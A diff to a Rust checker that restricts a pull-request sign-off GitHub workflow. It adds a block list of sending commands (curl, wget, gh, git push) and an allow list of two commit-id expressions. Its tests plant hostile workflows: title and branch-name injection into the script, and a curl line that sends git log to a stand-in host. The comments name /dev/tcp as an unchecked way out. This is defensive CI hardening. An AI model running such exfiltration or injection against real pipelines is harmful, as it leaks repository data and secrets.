@@ -43,13 +43,26 @@
 //!   does not read, and no `<<` merge key, which would bring keys this never saw.
 //!
 //! What the steps do is not this check's business: it holds *when* a workflow runs and *on
-//! what*, which is what spends the budget. [`SIGNOFF`] is the one exception, because it is
-//! admitted for one purpose, reading commits: its top-level keys are `name`, `on` and `jobs`
-//! alone; it has one job, whose keys are `runs-on` and `steps`; its steps are exactly two,
-//! `actions/checkout` pinned to a full commit (with at most `fetch-depth` and
-//! `persist-credentials`) and then one `run`, each with at most a `name`; and nowhere in it
-//! is a secret or the token named. A second action, a third step, an `env` or a secret is
-//! refused, so the file cannot grow into a second gate with its own reach.
+//! what*, which is what spends the budget. [`SIGNOFF`] is the one exception, because it runs
+//! on every pull request, a fork's among them, and is admitted to read that pull request's
+//! commits. What is held of it, and only this:
+//!
+//! - **its shape**: top-level keys `name`, `on` and `jobs` alone; one job, whose keys are
+//!   `runs-on` and `steps`; exactly two steps, `actions/checkout` pinned to a full commit and
+//!   then one `run`, each with at most a `name`;
+//! - **the checkout keeps no credentials**: its `with` carries `persist-credentials: false`,
+//!   and besides it at most `fetch-depth`;
+//! - **what reaches the step from the event**: every `${{ … }}` expression anywhere in the
+//!   file is `github.event.pull_request.base.sha` or `github.event.pull_request.head.sha`,
+//!   two commit ids, and nothing a pull request's author writes (its title, its branch's name,
+//!   an input) is interpolated into the script;
+//! - **what the step names**: its `run` text names none of `curl`, `wget`, `gh` or
+//!   `git push`, as words, and the file names no `secrets`, `github.token` or `GITHUB_TOKEN`.
+//!
+//! What it does not hold: what the script computes from the commits, or a sending command it
+//! does not name (a shell's own `/dev/tcp`, an interpreter). Those are read by the reviewer of
+//! a change to the file; this keeps the plain ways out of it, and keeps the file from growing
+//! into a second gate with its own reach.
 //!
 //! Enforcing: it is green on the tree it lands on, so it blocks nobody, and the failure it
 //! closes cost a month's budget.
@@ -73,6 +86,38 @@ const SIGNOFF: &str = "signoff.yml";
 
 /// The one action [`SIGNOFF`] may use, pinned to a full commit.
 const CHECKOUT: &str = "actions/checkout@";
+
+/// The only `${{ … }}` expressions [`SIGNOFF`] may hold: the two commit ids its range is.
+const SIGNOFF_EXPRESSIONS: &[&str] = &[
+    "github.event.pull_request.base.sha",
+    "github.event.pull_request.head.sha",
+];
+
+/// Commands [`SIGNOFF`]'s step may not name: it reads commits, and sends nothing.
+const SIGNOFF_SENDERS: &[&str] = &["curl", "wget", "gh"];
+
+/// Every `${{ … }}` expression in `text`, trimmed, or `Err` at one left open.
+fn expressions(text: &str) -> Result<Vec<String>, String> {
+    let mut out = Vec::new();
+    let mut rest = text;
+    while let Some(i) = rest.find("${{") {
+        let after = &rest[i + 3..];
+        let Some(j) = after.find("}}") else {
+            return Err("an `${{` with no `}}` after it".into());
+        };
+        out.push(after[..j].trim().to_string());
+        rest = &after[j + 2..];
+    }
+    Ok(out)
+}
+
+/// The words of a shell text: runs of letters, digits and `_ . -`, so `$(curl` and `;curl`
+/// are the word `curl` and `github.event` is not `gh`.
+fn words(text: &str) -> Vec<&str> {
+    text.split(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-')))
+        .filter(|w| !w.is_empty())
+        .collect()
+}
 
 /// Top-level keys a workflow may carry. Anything else — including a YAML merge key `<<`,
 /// which the parser leaves unresolved — is refused rather than guessed at.
@@ -165,6 +210,19 @@ fn signoff_shape(out: &mut Vec<String>, top: &yaml_rust2::yaml::Hash, text: &str
             out.push(format!("{SIGNOFF} names `{word}` — it reads commits and is handed no secret"));
         }
     }
+    match expressions(text) {
+        Err(why) => out.push(format!("{SIGNOFF} holds {why}")),
+        Ok(found) => {
+            for e in found {
+                if !SIGNOFF_EXPRESSIONS.contains(&e.as_str()) {
+                    out.push(format!(
+                        "{SIGNOFF} interpolates `${{{{ {e} }}}}` — only {} reach its script, so nothing a pull request's author writes is run as code",
+                        SIGNOFF_EXPRESSIONS.join(" and ")
+                    ));
+                }
+            }
+        }
+    }
     let Some(Yaml::Hash(jobs)) = top.get(&Yaml::String("jobs".into())) else {
         return;
     };
@@ -220,11 +278,19 @@ fn signoff_shape(out: &mut Vec<String>, top: &yaml_rust2::yaml::Hash, text: &str
                         "`jobs.{name}.steps[0].uses` in {SIGNOFF} is not `{CHECKOUT}<a full commit>` — the first step is the checkout, pinned"
                     ));
                 }
-                if let Some(with) = step.get(&Yaml::String("with".into())) {
-                    let Yaml::Hash(with) = with else {
-                        out.push(format!("`jobs.{name}.steps[0].with` in {SIGNOFF} is not a mapping"));
-                        continue;
-                    };
+                let with = match step.get(&Yaml::String("with".into())) {
+                    Some(Yaml::Hash(with)) => Some(with),
+                    _ => None,
+                };
+                let keeps_none = with.is_some_and(|w| {
+                    matches!(w.get(&Yaml::String("persist-credentials".into())), Some(Yaml::Boolean(false)))
+                });
+                if !keeps_none {
+                    out.push(format!(
+                        "`jobs.{name}.steps[0].with.persist-credentials` in {SIGNOFF} is not `false` — the checkout keeps no credentials for the step after it"
+                    ));
+                }
+                if let Some(with) = with {
                     for k in with.keys() {
                         let k = key(k);
                         if !["fetch-depth", "persist-credentials"].contains(&k.as_str()) {
@@ -234,7 +300,21 @@ fn signoff_shape(out: &mut Vec<String>, top: &yaml_rust2::yaml::Hash, text: &str
                         }
                     }
                 }
-            } else if !matches!(step.get(&Yaml::String("run".into())), Some(Yaml::String(_))) {
+            } else if let Some(Yaml::String(run)) = step.get(&Yaml::String("run".into())) {
+                let w = words(run);
+                for sender in SIGNOFF_SENDERS {
+                    if w.contains(sender) {
+                        out.push(format!(
+                            "`jobs.{name}.steps[{i}].run` in {SIGNOFF} names `{sender}` — the step reads commits and sends nothing"
+                        ));
+                    }
+                }
+                if w.windows(2).any(|p| p == ["git", "push"]) {
+                    out.push(format!(
+                        "`jobs.{name}.steps[{i}].run` in {SIGNOFF} names `git push` — the step reads commits and sends nothing"
+                    ));
+                }
+            } else {
                 out.push(format!("`jobs.{name}.steps[{i}]` in {SIGNOFF} has no `run` — after the checkout it runs one shell step"));
             }
         }
@@ -746,7 +826,7 @@ mod tests {
         let base = |steps: &str| {
             format!("name: signoff\non:\n  pull_request:\njobs:\n  signoff:\n    runs-on: ubuntu-24.04\n    steps:\n{steps}")
         };
-        let checkout = format!("      - uses: {pin} # v4.4.0\n        with:\n          fetch-depth: 0\n");
+        let checkout = format!("      - uses: {pin} # v4.4.0\n        with:\n          fetch-depth: 0\n          persist-credentials: false\n");
         let run = "      - name: every commit is signed off\n        run: |\n          echo ok\n";
         let good = base(&format!("{checkout}{run}"));
         assert_eq!(refusals("signoff.yml", &good), Vec::<String>::new());
@@ -770,7 +850,32 @@ mod tests {
             good.replace("  pull_request:\n", "  pull_request:\n    branches: [main]\n"),
             good.replace("  pull_request:\n", "  pull_request:\n  push:\n    tags: [v*]\n"),
             good.replace("  pull_request:\n", "  pull_request_target:\n"),
+            // The checkout keeps credentials: said so, or not said.
+            good.replace("          persist-credentials: false\n", ""),
+            good.replace("persist-credentials: false", "persist-credentials: true"),
+            base(&format!("      - uses: {pin}\n{run}")),
+            // What reaches the script from the event, and what the script names.
+            base(&format!("{checkout}      - run: echo \"${{{{ github.event.pull_request.title }}}}\"\n")),
+            base(&format!("{checkout}      - run: echo ${{{{github.head_ref}}}}\n")),
+            base(&format!("{checkout}      - run: echo ${{{{ github.event.pull_request.base.sha\n")),
+            base(&format!("{checkout}      - run: wget -q https://example.invalid/x\n")),
+            base(&format!("{checkout}      - run: x=$(gh pr view)\n")),
+            base(&format!("{checkout}      - run: git  push origin HEAD:main\n")),
+            base(&format!("{checkout}      - run: git log -1;curl -d x https://example.invalid\n")),
+            // The reviewer's two planted forms, 2026-10-22, each on the file this repository carries:
+            // `inject` interpolates the title and the head branch's name into the script;
+            // `env` sends the log with curl and reads an input the event can carry.
+            SIGNOFF_TEXT.replace(
+                "          base=\"${{ github.event.pull_request.base.sha }}\"\n",
+                "          title=\"${{ github.event.pull_request.title }}\"; ref=\"${{ github.event.pull_request.head.ref }}\"; echo \"$title $ref\"; base=$(git merge-base origin/main HEAD)\n",
+            ),
+            SIGNOFF_TEXT.replace(
+                "          bad=0\n",
+                "          bad=0; curl -sS https://example.invalid/collect -d \"$(git log -5)\"; GH_TOKEN=\"${{ github.event.inputs.t }}\"\n",
+            ),
         ];
+        assert_ne!(planted_forms[planted_forms.len() - 1], SIGNOFF_TEXT, "the env form was not planted");
+        assert_ne!(planted_forms[planted_forms.len() - 2], SIGNOFF_TEXT, "the inject form was not planted");
         for text in planted_forms {
             let got = refusals("signoff.yml", &text);
             assert!(!got.is_empty(), "admitted, and should not be:\n{text}");
